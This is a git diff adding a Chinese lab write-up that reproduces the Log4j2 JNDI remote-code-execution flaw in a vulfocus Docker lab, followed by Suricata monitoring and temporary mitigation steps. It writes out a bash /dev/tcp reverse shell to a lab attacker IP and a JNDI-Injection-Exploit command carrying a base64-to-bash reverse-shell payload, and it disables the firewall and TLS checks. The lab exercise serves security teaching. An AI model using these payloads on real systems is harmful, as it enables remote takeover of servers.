@@ -510,6 +510,295 @@
 
   检查DNS设置，发现没有报错，还是没有解决相关网站的登录问题。
 
+- 评估漏洞利用效果
+
+  进入靶标容器
+  >docker ps
+
+  >docker docker exec -it distracted_kepler bash
+
+  ![in](pic/docker_distracted.png)
+
+  查看支持的shell有哪些
+  >cat /etc/shells
+
+  ![report_shell](pic/report_shells.png)
+
+  查看攻击者主机ip，得到`192.168.56.104`
+
+  同时开启`7777端口`准备
+
+  在受害者靶机环境中单独测试一下有效负载，单行的bash反弹shell
+
+  >bash -i >& /dev/tcp/192.168.56.104/7777 0>&1
+
+  出现报错显示`Connection timed out`
+  ![error1](pic/error1.png)
+
+  - 搜索可能有的问题原因
+    
+    - 确认网络配置
+      进行攻击者和受害者主机之间的互ping
+      没有问题
+
+    - 检查防火墙设置
+      
+      检查状态
+      >sudo ufw status
+
+      停用ufw防火墙
+      >sudo ufw disable
+
+      确认网络配置。通过ping命令确保攻击者主机和受害者主机之间的网络连接正常
+      >ping 192.168.56.104
+      >ping 192.168.56.108
+
+      重新尝试执行
+
+      连接成果！！！
+  
+  ![connect](pic/connect.png)
+
+  达成在攻击者主机上完成窥探
+
+  在攻击者主机上执行
+  >ls /tmp
+
+  ![flag](pic/flag.png)
+
+  在vulfocus环境中所有的靶机都是在/tmp的目录下，有这样的靶标文件，得到flag
+  `flag-{bmhb02fe963-65ef-45bb-9dee-a0f8a9f30a3f}`
+
+  先不提交flag
+
+  换另外一种方式
+
+  下载工具
+  >wget https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip
+
+  出现报错：
+  ```
+  GnuTLS: Error in the pull function.
+  Unable to establish SSL connection.
+
+  ```
+
+  搜索显示可以通过` –no-check-certificate `参数,wget 将不会对服务器的 SSL 证书进行校验，并继续建立连接和下载文件。但请注意，在某些情况下，服务器的 SSL 证书无效可能意味着存在安全风险。
+
+  >wget --no-check-certificate https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip
+
+  但是依然出现`GnuTLS: Error in the pull function.Unable to establish SSL connection.`报错
+
+  有解决方法为编辑`/etc/hosts`文件，配置解析github
+
+  ```
+  vim /etc/hosts
+  192.30.253.112 github.com
+  199.232.28.133 raw.githubusercontent.com  
+  
+  ```
+  
+  重新尝试下载，依然报错`GnuTLS: Error in the pull function.Unable to establish SSL connection.`
+
+  关闭防火墙尝试报错
+
+  修改为curl下载方式依旧报错
+
+  >curl -LOk --insecure https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip
+
+  ```
+  curl: (35) OpenSSL SSL_connect: Connection reset by peer in connection to hub.fastgit.org:443 
+  ```
+
+  使用`--insecure`来禁用证书验证
+
+  >curl -LOk --insecure https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip
+
+  依旧有报错
+
+  查询其他方式解决
+  
+  下载安装JNDI-Injection-Exploit
+
+  >$ git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
+
+  >$ cd JNDI-Injection-Exploit
+
+  >$ mvn clean package -DskipTests
+
+  (maven通过`sudo apt install maven`安装)
+
+  通过查询.jar文件在target文件夹中
+
+  启动运行：
+  ```
+  java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c "{echo,28d9a54922100538d85b6939e5dce33f23646c7948f666ab7f2b7eaffd2bee76}|{base64,-d}|{bash,-i}" -A 192.168.56.104
+
+  ```
+
+
+  java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “反弹shell命令” -A “该IP是开启JDNI服务的主机地址”
+
+  ![JDNI_link](pic/JDNI-link.png)
+
+  得到rmi、ldap参数
+
+  对应端口开启监听
+
+  浏览器端访问payload
+
+  受到反弹shell，用find命令找flag
+
+  >find /tmp
+
+  得到flag`/tmp/flag-{bmhb02fe963-65ef-45bb-9dee-a0f8a9f30a3f} `
+
+  参考文章：
+
+  [Log4j2_RCE漏洞复现](https://blog.csdn.net/weixin_52091458/article/details/121980780)
+
+  [JNDI-Injection-Exploit](https://liuyixiang.com/post/103656.html)
+
+
+  [JNDI 注入利用工具](https://www.iculture.cc/forum-post/23278.html)
+
+  [以CVE-2020-8840为例分析Jackson漏洞](https://www.anquanke.com/post/id/226006)
+
+  [Log4j2远程代码执行漏洞(cve-2021-44228)复现](https://blog.csdn.net/weixin_46198176/article/details/124917641)
+
+  [Java安全之JNDI注入](https://www.cnblogs.com/nice0e3/p/13958047.html)
+
+  [JNDIExploit](https://github.com/WhiteHSBG/JNDIExploit)
+
+  [Mr-xn/JNDIExploit-1](https://github.com/Mr-xn/JNDIExploit-1)
+
+- 漏洞利用流量监测实战
+  
+  启动靶机镜像
+
+  启动 suricata 检测容器
+  此处 eth1 对应靶机所在虚拟机的 host-only 网卡 IP
+  
+  >docker run -d --name suricata --net=host -e SURICATA_OPTIONS="-i eth1" jasonish/suricata:6.0.4
+
+  - `jasonish/suricata:6.0.4`启动jasonish/suricata:6.0.4版本镜像
+
+    `-d`将镜像容器放到后台运行
+
+    `--name suricata`名字为suricata
+
+    `--net=host`网络方式选择宿主机网络
+
+    `-e SURICATA_OPTIONS="-i eth1"`传入名为SURICATA_OPTIONS环境变量，传入值为-i eth1
+
+    选择eth1因为当前有两块网卡
+    eth0为上网所需nat
+
+    eth1为靶机host_only的地址192.168.56.108
+
+  更新 suricata 规则，更新完成测试完规则之后会自动重启服务
+
+  >docker exec -it suricata suricata-update -f
+
+  监视suricata日志
+
+  >docker exec -it suricata tail -f /var/log/suricata/fast.log
+
+  ```
+  07/26/2023-13:12:00.731464  [**] [1:2022973:1] ET POLICY Possible Kali Linux hostname in DHCP Request Packet [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {UDP} 192.168.56.108:68 -> 192.168.56.100:67                            07/26/2023-13:17:00.731229  [**] [1:2022973:1] ET POLICY Possible Kali Linux hostname in DHCP Request Packet [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {UDP} 192.168.56.108:68 -> 192.168.56.100:67                            07/26/2023-13:27:00.735017  [**] [1:2022973:1] ET POLICY Possible Kali Linux hostname in DHCP Request Packet [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {UDP} 192.168.56.108:68 -> 192.168.56.100:67                            07/26/2023-13:32:00.737410  [**] [1:2022973:1] ET POLICY Possible Kali Linux hostname in DHCP Request Packet [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {UDP} 192.168.56.108:68 -> 192.168.56.100:67
+  ```
+  记录粘贴部分日志
+
+##### 漏洞利用防御与加固
+  
+![log4j JNDI Attack](pic/log4j_JNDI_Attack.png)
+
+- 临时修复方案
+    
+    1. 关闭lookup功能，即：设置 JVM 启动参数，修改启动脚本或命令，添加`-Dlog4j2.formatMsgNoLookups=true`启动参数和参数值。
+        使用修改后的脚本或命令重启服务。
+        例如：
+        原本启动脚本或命令：
+        >java -jar file.jar
+
+        修改后启动脚本或命令：
+        >java -Dlog4j2.formatMsgNoLookups=true -jar file.jar
+
+    2. 在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true;
+
+        也可以通命令行参数指定：
+
+        >java -Dlog4j.configurationFile=../config/log4j2.component.properties
+
+        通过Chat AI查询操作目的：
+        ```
+        - 添加log4j2.formatMsgNoLookups=true到配置文件或通过命令行参数指定-Dlog4j.configurationFile的方式，可以实现在应用程序运行时禁用Log4j2的JNDI查询，从而防止漏洞利用。
+
+        - 配置文件路径和命令行参数的目的是指示Log4j2使用特定的配置文件，在配置文件中设置log4j2.formatMsgNoLookups=true属性来修复漏洞
+
+        - 这些操作将确保在启动应用程序时，Log4j2将正确地加载修复漏洞的配置，并在后续的日志记录中禁止执行任意的JNDI查询。
+        ```
+        
+        具体操作为：
+
+        连接到正在运行的docker容器
+
+        >docker exec -it distractedcted_kepler bash
+
+        创建一个新的配置文件并编辑它，例如：
+        
+        >vim /demo/config/log4j2.component.properties
+
+        报错：`bash: vim: command not found`
+
+        说明没有安装vim编辑器，使用nano编辑器尝试
+
+        nano编辑器也未安装
+        
+        在本地，新建一个名为`log4j2.component.properties`的配置文件，并添加
+        >log4j2.formatMsgNoLookups=true
+
+        将文件复制到容器内的demo目录
+        >docker cp log4j2.component.properties distractedcted_kepler:/demo/
+
+        重新进入容器，并将复制文件移动到目标位置
+        >docker exec -it distractedcted_kepler bash
+        
+        >mv /demo/log4j2.component.properties /demo/config/
+
+        运行应用程序，指定log4j2配置文件的位置
+        >java -Dlog4j.configurationFile=../config/log4j2.component.properties -jar demo.jar
+        
+        (demo.jar为实际的应用程序jar文件)
+
+    3. 将系统环境变量 `FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS` 设置为 true
+  
+    三种方式也可以同时实施，以确保安全
+
+- 源码级修复方案
+  
+  
+        
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+
+
+
+
+
+
 
 
 
